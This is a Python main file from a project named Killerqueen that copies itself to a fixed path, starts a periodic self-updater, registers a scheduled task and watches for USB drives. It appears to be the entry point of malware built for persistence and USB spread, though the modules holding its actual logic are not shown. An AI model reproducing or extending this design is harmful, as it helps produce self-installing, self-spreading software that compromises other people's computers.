# Copyright (c) 2024 Latos
#
# This file is part of Killerqueen.
#
# Source Code: https://github.com/LatosProject/
#
# This software is released under the MIT License.
# https://opensource.org/licenses/MIT

import os
from killerqueen.scheduler import create_task
from killerqueen.updater import Updater
from killerqueen.utils import copy_self
from killerqueen.config import EXE_PATH
from killerqueen.usb_watchdog import detect_usb_drive
from killerqueen.config import LOCAL_VERSION, TEMP_EXE_PATH


def ensure_directory():
    os.makedirs(os.path.dirname(EXE_PATH), exist_ok=True)

def main():
    ensure_directory()
    copy_self()
    updater = Updater(local_version=LOCAL_VERSION, temp_path=TEMP_EXE_PATH)
    updater.start_periodic_check()
    create_task()
    detect_usb_drive()

if __name__ == "__main__":
    main()
